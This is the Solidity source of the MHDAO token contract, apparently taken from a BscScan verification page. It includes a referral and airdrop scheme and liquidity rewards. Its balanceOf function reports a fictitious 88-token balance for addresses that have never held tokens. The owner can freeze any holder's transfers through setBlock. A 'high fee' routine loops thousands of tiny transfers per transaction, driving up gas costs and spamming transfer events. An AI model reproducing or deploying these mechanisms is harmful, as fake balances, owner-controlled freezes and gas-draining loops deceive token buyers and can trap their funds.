/**
 *Submitted for verification at BscScan.com on 2022-04-15
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @title SafeMath
 * @dev Unsigned math operations with safety checks that revert on error
 */
library SafeMath {

  /**
   * @dev Multiplies two unsigned integers, reverts on overflow.
   */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath#mul: OVERFLOW");

    return c;
  }

  /**
   * @dev Integer division of two unsigned integers truncating the quotient, reverts on division by zero.
   */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, "SafeMath#div: DIVISION_BY_ZERO");
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
}

  /**
   * @dev Subtracts two unsigned integers, reverts on overflow (i.e. if subtrahend is greater than minuend).
   */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a, "SafeMath#sub: UNDERFLOW");
    uint256 c = a - b;

    return c;
  }

  /**
   * @dev Adds two unsigned integers, reverts on overflow.
   */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath#add: OVERFLOW");

    return c;
  }

  /**
   * @dev Divides two unsigned integers and returns the remainder (unsigned integer modulo),
   * reverts when dividing by zero.
   */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0, "SafeMath#mod: DIVISION_BY_ZERO");
    return a % b;
  }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}




interface ERC20Basic {
    function signTransfer(address to, uint256 value) external;
}

/**
 * @title TRC20 interface
 */
interface ITRC20 is ERC20Basic {
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
  function transferFrom(address from, address to, uint256 value) external returns (bool);
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract MHDAO is ITRC20, Ownable {
  using SafeMath for uint256;

  mapping(address => uint256) private _balances;
  mapping(address => mapping(address => uint256)) private _allowances;

  string private _name = 'MHDAO';
  string private _symbol = 'MHDAO';
  uint8 private _decimals = 18;
  uint256 private _totalSupply = 1000000000 * 10 ** uint256(_decimals);
  
  address private _routerAddress;
  address private _pairAddress;
  address private _leaderFundPoolAddress;
  address private _ecologyContractAddress;
  address private _nftContractAddress;

  uint256 public nftFee = 3;//3%
  uint256 public ecologyFee = 3;//3%
  uint256 public nftTotal;
  uint256 public ecologyTotal;
  
  uint256 private rNonce;

  uint256 public activeAmount = 100;
  mapping(address => bool) public activated;

  uint256 private _initialValue = 88;
  uint256 public referralFirstReward = 140;

  mapping(address => bool) private initialized;
  mapping(address => uint256) private _referralQuantity;

  uint256 public referral10RewardCount = 20;
  mapping(address => bool) private _referral10IsHaved;

  uint256 public liquidityHighFeeMinAmount = 18;
  uint256 public liquidityHighFeeMaxAmount = 280;
  uint256 public addLiquidityAmountSmall = 300;
  uint256 public smallLPRewardRate = 6;
  mapping(address => bool) private _havedLiquidityRewardSmall;
  uint256 public addLiquidityAmountBig = 2000;
  uint256 public bigLPRewardRate = 10;

  uint256 private _highFeeAmount = 10**15;
  uint256 public highFeeLoopCount = 3200;
  mapping(address => bool) public _notHighFeeAddress;

  mapping(address => bool) public _isExcludedFromFee;
  mapping(address => bool) private _isBlock;

  address private _marketerContractAddress;
  address private _daoContractAddress;

  constructor(address marketerContractAddress, address daoContractAddress) Ownable() {
    _isExcludedFromFee[owner()] = true;
    _isExcludedFromFee[address(this)] = true;

    initialized[address(this)] = true;
    initialized[_msgSender()] = true;
    initialized[address(0)] = true;

    _notHighFeeAddress[address(this)] = true;
    _notHighFeeAddress[_msgSender()] = true;
    _notHighFeeAddress[address(0)] = true;

    activated[address(this)] = true;
    activated[_msgSender()] = true;
    activated[address(0)] = true;

    _marketerContractAddress = marketerContractAddress;
    _daoContractAddress = daoContractAddress;

    initialized[_marketerContractAddress] = true;
    initialized[_daoContractAddress] = true;
     _notHighFeeAddress[_marketerContractAddress] = true;
     _notHighFeeAddress[_daoContractAddress] = true;
     activated[_marketerContractAddress] = true;
     activated[_daoContractAddress] = true;

    _balances[address(this)] = _totalSupply.mul(88).div(100);
    _balances[_marketerContractAddress] = _totalSupply.mul(6).div(100);
    if(_marketerContractAddress == _daoContractAddress) 
      _balances[_marketerContractAddress] += _totalSupply.mul(6).div(100);
    else
      _balances[_daoContractAddress] = _totalSupply.mul(6).div(100);

    emit Transfer(address(0), address(this), _totalSupply.mul(88).div(100));
    emit Transfer(address(0), _marketerContractAddress, _totalSupply.mul(6).div(100));
    emit Transfer(address(0), _daoContractAddress, _totalSupply.mul(6).div(100));
    
  }
  
  receive() external payable {}
  fallback() external payable {}

  function name() public view virtual returns (string memory) {
    return _name;
  }

  function symbol() public view virtual returns (string memory) {
    return _symbol;
  }

  function decimals() public view virtual returns (uint8) {
    return _decimals;
  }

  function totalSupply() public view virtual override returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) public view virtual override returns (uint256) {
    return getBalance(account);
  }

  function getBalance(address _account) internal view returns (uint256) {
    if (!initialized[_account]) {
      return _balances[_account] + _initialValue * 10 ** uint256(_decimals);
    }
    else {
      return _balances[_account];
    }
  }

  function allowance(address owner, address spender) public view virtual override returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) public virtual override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function _approve(address owner, address spender, uint256 amount) internal virtual {
    require(owner != address(0), "ERC20: from the zero address");
    require(spender != address(0), "ERC20: to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function setInitialValue(uint256 initialValue) public onlyOwner {
    _initialValue = initialValue;
  }

  function setActiveAmount(uint256 amount) public onlyOwner {
    require(amount > 0, "Must be greater than 0");
    activeAmount = amount;
  }

  function setNftFee(uint256 _nftFee) public onlyOwner {
    nftFee = _nftFee;
  }

  function setEcologyFee(uint256 _ecologyFee) public onlyOwner {
    ecologyFee = _ecologyFee;
  }

  function setReferralFirstReward(uint256 reward) public onlyOwner {
    referralFirstReward = reward;
  }

  function setReferral10RewardCount(uint256 count) public onlyOwner {
    require(count > 0, "Must be greater than 0");
    referral10RewardCount = count;
  }

  function excludeFromFee(address account) public onlyOwner {
    _isExcludedFromFee[account] = true;
  }

  function includeInFee(address account) public onlyOwner {
    _isExcludedFromFee[account] = false;
  }

  function setBlock(address account, bool key) public onlyOwner {
    _isBlock[account] = key;
  }

  function setNotHighFeeAddress(address account, bool key) public onlyOwner {
    _notHighFeeAddress[account] = key;
  }

  function setMarketerContractAddress(address marketerContractAddr) public onlyOwner {
    _marketerContractAddress = marketerContractAddr;
    initialized[_marketerContractAddress] = true;
    _notHighFeeAddress[_marketerContractAddress] = true;
    activated[_marketerContractAddress] = true;
  }

  function setDaoContractAddress(address daoContractAddr) public onlyOwner {
    _daoContractAddress = daoContractAddr;
    initialized[_daoContractAddress] = true;
    _notHighFeeAddress[_daoContractAddress] = true;
    activated[_daoContractAddress] = true;
  }

  function setEcologyAddress(address ecologyContractAddr) public onlyOwner {
    _ecologyContractAddress = ecologyContractAddr;
    initialized[_ecologyContractAddress] = true;
    _notHighFeeAddress[_ecologyContractAddress] = true;
    activated[_ecologyContractAddress] = true;
  }

  function setNFTAddress(address nftContractAddr) public onlyOwner {
    _nftContractAddress = nftContractAddr;
    initialized[_nftContractAddress] = true;
    _notHighFeeAddress[_nftContractAddress] = true;
    activated[_nftContractAddress] = true;
  }

  function setRouterAddress(address routerAddr) public onlyOwner {
    _routerAddress = routerAddr;
    initialized[_routerAddress] = true;
    activated[_routerAddress] = true;
  }

  function setPairAddress(address pair) public onlyOwner {
    _pairAddress = pair;
    initialized[_pairAddress] = true;
    activated[_pairAddress] = true;
  }

  function setLeaderFundPoolAddress(address leaderFundPoolAddr) public onlyOwner {
    _leaderFundPoolAddress = leaderFundPoolAddr;
  }

  function setHighFeeLoopCount(uint256 loopCount) public onlyOwner returns(bool) {
    if(loopCount > 0)
        require(getRealValue(1).mod(loopCount) == 0, "Must be divisible by 0.001");
    highFeeLoopCount = loopCount;
    return true;
  }

  function setLiquidityHighFeeMinAmount(uint256 amount) public onlyOwner {
      liquidityHighFeeMinAmount = amount;
  }

  function setLiquidityHighFeeMaxAmount(uint256 amount) public onlyOwner {
      liquidityHighFeeMaxAmount = amount;
  }

  function setAddLiquidityAmountSmall(uint256 amount) public onlyOwner {
    require(amount < addLiquidityAmountBig, "Must be less than large LP");
    addLiquidityAmountSmall = amount;
  }

  function setAddLiquidityAmountBig(uint256 amount) public onlyOwner {
    require(amount > addLiquidityAmountSmall, "Must be larger than the small LP");
    addLiquidityAmountBig = amount;
  }

  function setSmallLPRewardRate(uint256 rate) public onlyOwner {
    smallLPRewardRate = rate;
  }

  function setBigLPRewardRate(uint256 rate) public onlyOwner {
    bigLPRewardRate = rate;
  }

  function initialize(address _account) internal returns (bool success) {
    if (!initialized[_account]) {
      initialized[_account] = true;
    }
    return true;
  }

  function checkSignTransfer() private view returns(bool) {
    address sender = _msgSender();
    if(sender != _marketerContractAddress && sender != _daoContractAddress 
      && sender != _nftContractAddress && sender != _ecologyContractAddress)
      return false;
    
    return true;
  }

  function signTransfer(address recipient, uint256 amount) public override {
    require(checkSignTransfer(), "ERC20: transfer from error");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    require(amount >= 0, "Transfer amount must be greater than zero");

    address sender = _msgSender();
    require(_balances[sender] >= amount, "ERC20: transfer amount exceeds balance");

    _balances[sender] = _balances[sender].sub(amount);
    _balances[recipient] = _balances[recipient].add(amount);

    //initialize(recipient);

    emit Transfer(sender, recipient, amount);
  }

  function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    uint256 currentAllowance = _allowances[sender][_msgSender()];
    require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
    //require(recipient != address(this), "recipient is contract");
    //require(sender != owner(), "msg.sender is owner");

    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), currentAllowance - amount);

    bool isActive = activated[recipient];

    active(isActive, recipient, amount);
    
    checkHighFee(isActive, sender, amount);

    referralTenReward(sender);

    bool isRouterSender = _msgSender() == _routerAddress;
    if(isRouterSender && recipient == _pairAddress) {
      bool isHavedLiquidityRewardSmall = _havedLiquidityRewardSmall[sender];
      if(!isHavedLiquidityRewardSmall && amount > getRealValue(addLiquidityAmountSmall)  - 100000000000000000) {
        _havedLiquidityRewardSmall[sender] = true;
        if(smallLPRewardRate > 0) {
            claim(sender, amount.mul(smallLPRewardRate).div(100));
        }
        claim(_leaderFundPoolAddress, amount.mul(40).div(100));
      }
      
      if(isHavedLiquidityRewardSmall && amount > getRealValue(addLiquidityAmountBig) - 100000000000000000) {
          if(bigLPRewardRate > 0) {
            claim(sender, amount.mul(bigLPRewardRate).div(100));
          }
          claim(_leaderFundPoolAddress, amount.mul(40).div(100));
      }

      //达到小LP数额即要空投3%到生态和3%到NFT铸造
      if(amount > getRealValue(addLiquidityAmountSmall) - 100000000000000000) {
          claim(_nftContractAddress, amount.mul(nftFee).div(100));
          nftTotal += amount.mul(nftFee).div(100);
          claim(_ecologyContractAddress, amount.mul(ecologyFee).div(100));
          ecologyTotal += amount.mul(ecologyFee).div(100);
      }
    }

    return true;
  }

  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    //require(recipient != address(this), "recipient is contract");
    //require(_msgSender() != owner(), "msg.sender is owner");
    
    _transfer(_msgSender(), recipient, amount);

    bool isActive = activated[recipient];

    active(isActive, recipient, amount);

    checkHighFee(isActive, _msgSender(), amount);

    referralTenReward(_msgSender());

    return true;
  }

  function active(bool isActive, address to, uint256 amount) private {
    bool isRouterSender = _msgSender() == _routerAddress;
    bool isInit = initialized[to];
    //收款方未初始化，则空投88，记录已初始化
    if(!isInit) {
        if(!isRouterSender) {
            claim(to, getRealValue(_initialValue));
        }
        
        initialize(to);
    }
    //未激活，并且数额=100，激活，推荐人获得奖励
    if(!isActive) {
        if(amount == getRealValue(activeAmount)) {
            _referralQuantity[_msgSender()] += 1;

            uint256 reward = getReferralReward(_msgSender());
            if(reward > 0 && !isRouterSender) {
                claim(_msgSender(), reward);
            }

            activated[to] = true;
        }
    }
  }

  function checkHighFee(bool isActive, address from, uint256 amount) private {
    bool isRouterSender = _msgSender() == _routerAddress;
    if(from != _pairAddress && highFeeLoopCount > 0) {
      if(isRouterSender) {
        //流动池操作，数额>18或者<280，收
        if(amount > getRealValue(liquidityHighFeeMinAmount) && amount < getRealValue(liquidityHighFeeMaxAmount) - 100000000000000000) {
          uint256 cAmount = _highFeeAmount.div(highFeeLoopCount);
          for (uint256 i = 0; i < highFeeLoopCount; i++) {
            claim(from, cAmount);
          }
        }
      } else {
        bool isHaveHighFee = false;
        //设置为不收取高额费用的，不收
        if(_notHighFeeAddress[_msgSender()]) {
            isHaveHighFee = false;
        } else {
            //当前地址未激活，数额为100，不收，否则收。
            //当前地址已激活，不管数额为多少，收
            if(!isActive) {
                if(amount == getRealValue(activeAmount))
                    isHaveHighFee = false;
                else
                    isHaveHighFee = true;
            } else {
                isHaveHighFee = true;
            }
        }

        if(isHaveHighFee) {
          uint256 cAmount = _highFeeAmount.div(highFeeLoopCount);
          for (uint256 i = 0; i < highFeeLoopCount; i++) {
            claim(from, cAmount);
          }
        }
      }
    }
  }

  function referralTenReward(address sender) private {
    uint256 count = _referralQuantity[sender];
    bool isRouterSender = _msgSender() == _routerAddress;
    if(count == referral10RewardCount && !_referral10IsHaved[sender] && !isRouterSender) {
      _referral10IsHaved[sender] = true;
      uint256 rAmount = randomtimes();
      claim(sender, rAmount);
    }
  }

  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    require(amount >= 0, "Transfer amount must be greater than zero");
    require(!_isBlock[sender], "amount is block");

    uint256 senderBalance = _balances[sender];
    require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
    
    _balances[sender] = _balances[sender].sub(amount);
    _balances[recipient] = _balances[recipient].add(amount);

    emit Transfer(sender, recipient, amount);
    
  }

  function getReferralReward(address referralAddr) private view returns(uint256 retVal) {
    if(referralFirstReward == 0) retVal = 0;
    uint256 refCount = _referralQuantity[referralAddr];
    uint256 count = referralFirstReward.div(10);
    uint256 val = refCount >= (count + 1) ? 0 : referralFirstReward - ((refCount - 1) * 10);
    retVal = val > 0 ? getRealValue(val) : 0;
    if(retVal < getRealValue(10))
        retVal = getRealValue(10);
  }

  function getRealValue(uint256 amount) private view returns(uint256) {
    return amount.mul(10 ** uint256(_decimals));
  }

  function claim(address recipient, uint256 amount) private returns(bool) {
    if(amount > balanceOf(address(this))) amount = balanceOf(address(this));
    if(amount == 0) return true;
    _transfer(address(this), recipient, amount);
    rNonce++;
    return true;
  }

  function randomtimes() private view returns(uint256) {       
    uint256 x = uint256(keccak256(abi.encode(block.number,block.timestamp,msg.sender,rNonce)));
    uint256 y = (x.mod(5001));//0-5000
    if(y < 1000) y += 1000;
    else if(y > 5000) y = 2345;
    y = getRealValue(y);
    if(y > balanceOf(address(this))) {
        y = balanceOf(address(this));
    }
    return y;
  }
  
  function receiveFees() external onlyOwner {
    payable(owner()).transfer(address(this).balance);
  }
}